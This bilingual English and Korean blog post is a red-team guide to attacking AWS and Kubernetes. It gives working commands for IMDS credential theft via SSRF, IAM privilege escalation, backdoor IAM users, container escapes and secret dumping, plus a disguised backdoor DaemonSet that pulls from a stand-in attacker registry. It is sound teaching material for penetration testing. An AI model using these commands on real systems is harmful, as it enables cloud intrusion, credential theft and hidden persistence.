---
title: "Offensive Security Fundamentals in AWS & Kubernetes"
key: page-offensive_security_aws_k8s
categories:
- Security
- Cloud Security
author: hyoeun
math: true
mathjax_autoNumber: true
image: "/assets/thumbnails/2026-05-14-offensive_security_aws_k8s.png"
bilingual: true
date: 2026-05-14 00:47:00
---

## Offensive Security Fundamentals in AWS & Kubernetes

As cloud-native architectures dominate modern infrastructure, the attack surface for adversaries has dramatically expanded. AWS and Kubernetes are the two most dominant platforms in the enterprise cloud space — and understanding how attackers approach them is essential for any security practitioner who wants to think offensively. This post serves as a field guide for red teamers and cloud penetration testers entering these environments.

## Part 1: AWS Offensive Security

### 1. Reconnaissance — Finding the Attack Surface

Before touching any service, adversaries enumerate the target's AWS footprint using passive and active techniques.

**Passive Recon:**
- **OSINT via GitHub:** Developers often accidentally commit AWS credentials (`aws_access_key_id`, `aws_secret_access_key`) into public repositories. Tools like `trufflehog` and `gitleaks` automate this discovery.
- **S3 Bucket Enumeration:** Misconfigured public S3 buckets remain one of the most common cloud misconfigurations. Tools like `S3Scanner` or `cloud_enum` enumerate buckets associated with a target's domain.
- **DNS & Certificate Transparency:** Subdomains can reveal internal service endpoints (e.g., `api.internal.target.com` pointing to an AWS ALB).

**Active Recon with Valid Credentials:**
Once credentials are obtained, attackers use the AWS CLI to profile the environment:

```bash
# Identify the current identity
aws sts get-caller-identity

# Enumerate IAM permissions (the "what can I do?" question)
aws iam list-attached-user-policies --user-name <username>
aws iam get-policy-version --policy-arn <arn> --version-id v1

# Enumerate services
aws s3 ls
aws ec2 describe-instances --region us-east-1
aws lambda list-functions
```

**Key Tool: `enumerate-iam`**
This tool brute-forces which API actions are available to a given set of credentials by calling every AWS API endpoint and recording successes.

```bash
python3 enumerate-iam.py --access-key AKIA... --secret-key ...
```

### 2. IAM Privilege Escalation — The Core of AWS Attacks

IAM (Identity and Access Management) misconfigurations are the #1 attack vector in AWS. An attacker with limited permissions can often escalate to admin via creative abuse of IAM policies.

**Common Escalation Paths:**

| Misconfiguration | Exploitation Method |
|---|---|
| `iam:CreatePolicyVersion` | Create a new policy version with `*:*` permissions |
| `iam:AttachUserPolicy` | Attach the AdministratorAccess policy to yourself |
| `iam:PassRole` + `ec2:RunInstances` | Launch an EC2 instance with an admin role attached |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Create a Lambda with an admin role and invoke it |
| `sts:AssumeRole` | Assume a role with higher permissions |

**Practical Example — `iam:CreatePolicyVersion`:**

```bash
# Create a new policy version that grants full admin access
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/TargetPolicy \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

**Tool: `Pacu`** — The AWS exploitation framework, analogous to Metasploit for AWS.

```bash
# Inside Pacu, run the IAM privilege escalation scanner
Pacu > run iam__privesc_scan
```

### 3. Credential Theft from EC2 Instances

EC2 instances with an IAM role attached expose credentials via the **Instance Metadata Service (IMDS)**.

**IMDSv1 (Legacy — Unauthenticated):**
If the target application has an SSRF vulnerability, an attacker can fetch credentials directly:

```bash
# SSRF payload targeting IMDS
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

**IMDSv2 (Token-Required):**
Even with IMDSv2 enforced, a two-step SSRF may still work:

```bash
# Step 1: Get a session token via PUT
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use the token to fetch credentials
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

### 4. Lateral Movement & Persistence in AWS

**Cross-Account Role Assumption:**
If a role's trust policy is overly permissive (`sts:AssumeRole` from `*`), an attacker can pivot across AWS accounts.

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::TARGET_ACCOUNT_ID:role/CrossAccountRole \
  --role-session-name attacker-session
```

**Persistence via Backdoor IAM User:**
```bash
# Create a stealthy backdoor user
aws iam create-user --user-name backup-svc
aws iam attach-user-policy --user-name backup-svc \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backup-svc
```

**Lambda Backdoor:**
Injecting malicious code into an existing Lambda function that exfiltrates data or maintains a callback channel.

### 5. Key AWS Attack Tools

| Tool | Purpose |
|---|---|
| **Pacu** | Full AWS exploitation framework |
| **ScoutSuite** | Multi-cloud security auditing |
| **CloudSploit** | AWS misconfiguration scanning |
| **enumerate-iam** | Brute-force IAM permission discovery |
| **WeirdAAL** | AWS attack library |
| **Prowler** | AWS security assessment tool |

## Part 2: Kubernetes (K8s) Offensive Security

### 1. K8s Architecture — The Attacker's Mental Model

To attack Kubernetes effectively, understand what you're targeting:

```
Control Plane:
  ├── kube-apiserver   ← Primary attack target
  ├── etcd             ← Contains ALL cluster secrets
  ├── kube-scheduler
  └── kube-controller-manager

Worker Nodes:
  ├── kubelet          ← Can be abused if exposed
  └── kube-proxy

Attack Surfaces:
  ├── Exposed API Server (port 6443/8443/8080)
  ├── kubelet API (port 10250)
  ├── etcd (port 2379)
  └── Container runtime (Docker socket / containerd)
```

### 2. Reconnaissance Against K8s Clusters

**External Recon:**
```bash
# Scan for exposed Kubernetes API servers
nmap -p 6443,8443,8080,10250,2379 <target_range>

# Check if the API is anonymously accessible
curl -sk https://<target>:6443/version
curl -sk https://<target>:6443/api/v1/namespaces
```

**Internal Recon (from a compromised pod):**
```bash
# Every pod has these environment variables set
echo $KUBERNETES_SERVICE_HOST
echo $KUBERNETES_SERVICE_PORT

# The service account token is automatically mounted
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Query the API server from within the pod
curl -sk https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
```

### 3. RBAC Misconfigurations — The IAM Equivalent for K8s

Kubernetes Role-Based Access Control (RBAC) is powerful but frequently misconfigured.

**Common Dangerous RBAC Patterns:**

```yaml
# CRITICAL: Wildcard permissions = effectively cluster-admin
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# DANGEROUS: Can create pods → can escape to node
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "get", "list"]

# DANGEROUS: Can exec into pods → can steal secrets
rules:
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]
```

**Privilege Escalation via Pod Creation:**
If you can create pods, you can mount the host filesystem and escape the container:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwned
    image: alpine
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -- /bin/bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-vol
  volumes:
  - name: host-vol
    hostPath:
      path: /
```

### 4. Container Escape Techniques

**Technique 1: Privileged Container Escape**
A container running with `privileged: true` can access the host's devices directly.

```bash
# Inside a privileged container
# Mount the host disk and chroot into it
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host bash

# Now you're operating as root on the NODE
```

**Technique 2: Docker Socket Abuse**
If `/var/run/docker.sock` is mounted into a container:

```bash
# List host containers
docker -H unix:///var/run/docker.sock ps

# Spin up a new container with host filesystem
docker -H unix:///var/run/docker.sock run -v /:/host \
  --rm -it alpine chroot /host sh
```

**Technique 3: Abusing Service Account Tokens**
Tokens mounted into pods can have excessive permissions:

```bash
# Use kubectl from within the pod
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT

# Get all secrets in the cluster (if permitted)
curl -sk $APISERVER/api/v1/secrets \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

### 5. Lateral Movement in Kubernetes

**Pivoting via Service Discovery:**
Kubernetes automatically creates DNS entries for services. From a compromised pod, an attacker can reach any service:

```bash
# Reach another service in the cluster
curl http://internal-api.production.svc.cluster.local/admin
curl http://database.default.svc.cluster.local:5432
```

**Stealing Secrets:**
```bash
# List all secrets (requires get/list on secrets resource)
kubectl get secrets --all-namespaces -o json

# Decode a secret
kubectl get secret <secret-name> -o jsonpath='{.data.password}' | base64 -d
```

**Accessing etcd Directly:**
etcd stores ALL Kubernetes state, including secrets in plaintext (base64 encoded):

```bash
# If etcd is accessible
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix --keys-only
```

### 6. Persistence in Kubernetes

**Deploying a Backdoor DaemonSet:**
A DaemonSet runs on EVERY node in the cluster:

```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: kube-proxy-monitor   # Blend in with legitimate names
  namespace: kube-system
spec:
  selector:
    matchLabels:
      app: kube-proxy-monitor
  template:
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: monitor
        image: attacker.registry/backdoor:latest
        securityContext:
          privileged: true
```

**Webhook Abuse:**
Mutating Admission Webhooks can intercept and modify ALL pod creations — a perfect persistence mechanism that modifies workloads transparently.

### 7. Key K8s Attack Tools

| Tool | Purpose |
|---|---|
| **kubectl** | Native CLI, essential for enumeration |
| **kube-hunter** | Kubernetes penetration testing |
| **Peirates** | Kubernetes attack framework |
| **CDK** (Container & Docker Killer) | Container escape toolkit |
| **kubesploit** | Post-exploitation framework for K8s |
| **rbac-police** | RBAC misconfiguration detection |
| **Trivy** | Container/cluster vulnerability scanning |

## Conclusion: Thinking Like an Attacker in the Cloud

Both AWS and Kubernetes share a common theme: **over-permissive identities are the root cause of most compromises.** Whether it's an IAM role with `*:*` permissions or a Kubernetes service account with `cluster-admin`, privilege mismanagement creates the path attackers follow from initial access to full environment compromise.

The key mindset shifts for cloud offensive security:
1. **Credentials are the keys** — treat every exposed secret as a critical finding.
2. **The metadata service is your friend** — always check IMDS in EC2 contexts.
3. **Container ≠ isolation** — privileged containers and host mounts break all security boundaries.
4. **RBAC is hard** — every `*` wildcard is a potential escalation path.

Understanding these fundamentals from the attacker's perspective is what separates a solid cloud security practitioner from one who only knows how to read compliance checklists.

---

## AWS & Kubernetes 공격 보안 기초

클라우드 네이티브 아키텍처가 현대 인프라를 지배하면서, 공격자들의 공격 표면은 급격히 넓어졌습니다. AWS와 Kubernetes는 기업 클라우드 환경에서 가장 지배적인 두 플랫폼입니다. 방어를 잘하려면 공격자가 어떻게 접근하는지 이해해야 합니다. 이 포스트는 이러한 환경에 처음 진입하는 레드팀원과 클라우드 침투 테스터를 위한 현장 가이드입니다.

## Part 1: AWS 공격 보안

### 1. 정찰 — 공격 표면 파악하기

어떤 서비스에도 손대기 전에, 공격자는 수동 및 능동적인 기술을 사용하여 대상의 AWS 규모를 파악합니다.

**수동 정찰:**
- **GitHub OSINT:** 개발자들은 종종 `aws_access_key_id`, `aws_secret_access_key`와 같은 AWS 자격 증명을 공개 레포지토리에 실수로 커밋합니다. `trufflehog`와 `gitleaks` 같은 도구가 이를 자동으로 탐지합니다.
- **S3 버킷 열거:** 잘못 구성된 공개 S3 버킷은 여전히 가장 흔한 클라우드 오설정 중 하나입니다. `S3Scanner`나 `cloud_enum`으로 대상 도메인과 연관된 버킷을 열거할 수 있습니다.
- **DNS 및 인증서 투명성:** 서브도메인을 통해 내부 서비스 엔드포인트를 발견할 수 있습니다.

**유효한 자격 증명으로 능동 정찰:**
자격 증명을 획득하면 공격자는 AWS CLI로 환경을 프로파일링합니다:

```bash
# 현재 아이덴티티 확인
aws sts get-caller-identity

# IAM 권한 열거 ("내가 무엇을 할 수 있는가?" 질문)
aws iam list-attached-user-policies --user-name <username>

# 서비스 열거
aws s3 ls
aws ec2 describe-instances --region us-east-1
aws lambda list-functions
```

**핵심 도구: `enumerate-iam`**
이 도구는 모든 AWS API 엔드포인트를 호출하고 성공한 것을 기록하여, 주어진 자격 증명으로 사용 가능한 API 액션을 브루트포스합니다.

### 2. IAM 권한 상승 — AWS 공격의 핵심

IAM(Identity and Access Management) 오설정은 AWS의 1위 공격 벡터입니다. 제한된 권한을 가진 공격자도 IAM 정책의 창의적인 악용을 통해 관리자로 권한을 상승시킬 수 있습니다.

**주요 권한 상승 경로:**

| 오설정 | 악용 방법 |
|---|---|
| `iam:CreatePolicyVersion` | `*:*` 권한의 새 정책 버전 생성 |
| `iam:AttachUserPolicy` | 자신에게 AdministratorAccess 정책 연결 |
| `iam:PassRole` + `ec2:RunInstances` | 관리자 역할이 연결된 EC2 인스턴스 실행 |
| `iam:PassRole` + `lambda:CreateFunction` | 관리자 역할의 Lambda 생성 및 실행 |
| `sts:AssumeRole` | 더 높은 권한의 역할 가정 |

**핵심 도구: `Pacu`** — AWS용 Metasploit과 유사한 AWS 익스플로잇 프레임워크입니다.

### 3. EC2 인스턴스에서 자격 증명 탈취

IAM 역할이 연결된 EC2 인스턴스는 **인스턴스 메타데이터 서비스(IMDS)**를 통해 자격 증명을 노출합니다.

**IMDSv1 (구버전 — 비인증):**
대상 애플리케이션에 SSRF 취약점이 있는 경우, 공격자는 IMDS에서 직접 자격 증명을 가져올 수 있습니다:

```bash
# IMDS를 대상으로 하는 SSRF 페이로드
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

**IMDSv2 (토큰 필수):**
IMDSv2가 강제되더라도 2단계 SSRF를 통해 자격 증명 탈취가 가능할 수 있습니다.

### 4. AWS에서의 횡적 이동 및 지속성 유지

**교차 계정 역할 가정:**
역할의 신뢰 정책이 과도하게 허용적이라면 (`sts:AssumeRole`이 `*`에서 가능), 공격자는 AWS 계정 간에 피벗할 수 있습니다.

**백도어 IAM 사용자를 통한 지속성 유지:**
```bash
# 은밀한 백도어 사용자 생성
aws iam create-user --user-name backup-svc
aws iam attach-user-policy --user-name backup-svc \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

---

## Part 2: Kubernetes (K8s) 공격 보안

### 1. K8s 아키텍처 — 공격자의 멘탈 모델

Kubernetes를 효과적으로 공격하려면 대상을 이해해야 합니다:

```
컨트롤 플레인:
  ├── kube-apiserver   ← 주요 공격 대상
  ├── etcd             ← 모든 클러스터 시크릿 포함
  ├── kube-scheduler
  └── kube-controller-manager

공격 표면:
  ├── 노출된 API 서버 (포트 6443/8443/8080)
  ├── kubelet API (포트 10250)
  ├── etcd (포트 2379)
  └── 컨테이너 런타임 (Docker 소켓 / containerd)
```

### 2. K8s 클러스터에 대한 정찰

**내부 정찰 (침해된 파드에서):**
```bash
# 모든 파드에는 이 환경 변수가 설정되어 있음
echo $KUBERNETES_SERVICE_HOST

# 서비스 어카운트 토큰이 자동으로 마운트됨
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 3. RBAC 오설정 — K8s의 IAM 등가물

Kubernetes RBAC는 강력하지만 자주 잘못 구성됩니다.

**위험한 RBAC 패턴:**
```yaml
# 치명적: 와일드카드 권한 = 사실상 cluster-admin
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]

# 위험: 파드 생성 가능 → 노드 탈출 가능
rules:
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["create", "get", "list"]
```

### 4. 컨테이너 탈출 기법

**기법 1: 권한 있는 컨테이너 탈출**
`privileged: true`로 실행되는 컨테이너는 호스트의 디바이스에 직접 접근할 수 있습니다.

**기법 2: Docker 소켓 악용**
`/var/run/docker.sock`가 컨테이너에 마운트된 경우, 호스트 파일시스템을 마운트한 새 컨테이너를 생성하여 노드로 탈출할 수 있습니다.

**기법 3: 서비스 어카운트 토큰 악용**
파드에 마운트된 토큰이 과도한 권한을 가질 경우, API 서버에 직접 요청하여 클러스터 내 모든 시크릿에 접근할 수 있습니다.

### 5. Kubernetes에서의 횡적 이동 및 지속성 유지

**서비스 디스커버리를 통한 피벗:**
Kubernetes는 서비스에 대한 DNS 항목을 자동으로 생성합니다. 침해된 파드에서 공격자는 모든 서비스에 접근할 수 있습니다:

```bash
# 클러스터 내 다른 서비스에 접근
curl http://internal-api.production.svc.cluster.local/admin
curl http://database.default.svc.cluster.local:5432
```

**etcd에 직접 접근:**
etcd는 시크릿을 포함한 모든 Kubernetes 상태를 저장합니다. etcd에 직접 접근할 수 있다면 게임 오버입니다.

### 6. Kubernetes에서의 지속성 유지

**백도어 DaemonSet 배포:**
DaemonSet은 클러스터의 모든 노드에서 실행됩니다. `kube-proxy-monitor`처럼 합법적인 이름으로 위장하고, `kube-system` 네임스페이스에 배포하면 탐지를 회피할 수 있습니다.

**Webhook 악용:**
Mutating Admission Webhook은 모든 파드 생성을 가로채고 수정할 수 있습니다. 이는 모든 워크로드를 투명하게 수정하는 완벽한 지속성 메커니즘입니다.

### 7. Key K8s 공격 도구들

| 도구 | 용도 |
|---|---|
| **kubectl** | 기본 CLI, 정보 수집에 필수적임 |
| **kube-hunter** | Kubernetes 침투 테스트 도구 |
| **Peirates** | Kubernetes 공격 프레임워크 |
| **CDK** | 컨테이너 탈출 툴킷 |
| **kubesploit** | K8s 사후 침투 프레임워크 |
| **rbac-police** | RBAC 오설정 탐지 도구 |
| **Trivy** | 컨테이너/클러스터 취약점 스캐닝 |

## 결론: 클라우드에서 공격자처럼 생각하기

AWS와 Kubernetes는 공통된 주제를 공유합니다: **과도한 권한을 가진 아이덴티티가 대부분의 침해의 근본 원인입니다.** `*:*` 권한의 IAM 역할이든, `cluster-admin`을 가진 Kubernetes 서비스 어카운트든, 권한 오관리가 공격자들이 초기 접근에서 전체 환경 침해까지 따라가는 경로를 만들어냅니다.

클라우드 공격 보안의 핵심 사고방식 전환:
1. **자격 증명이 열쇠다** — 노출된 모든 시크릿을 심각한 발견으로 취급하세요.
2. **메타데이터 서비스는 공격자의 친구다** — EC2 컨텍스트에서는 항상 IMDS를 확인하세요.
3. **Container ≠ isolation** — 권한 있는 컨테이너와 호스트 마운트는 모든 보안 경계를 무너뜨립니다.
4. **RBAC는 어렵다** — 모든 `*` 와일드카드는 잠재적인 권한 상승 경로입니다.

공격자의 관점에서 이러한 기본기를 이해하는 것이, 단순히 규정 준수 체크리스트를 읽을 줄만 아는 사람과 진정한 클라우드 보안 전문가를 구분짓는 차이입니다.
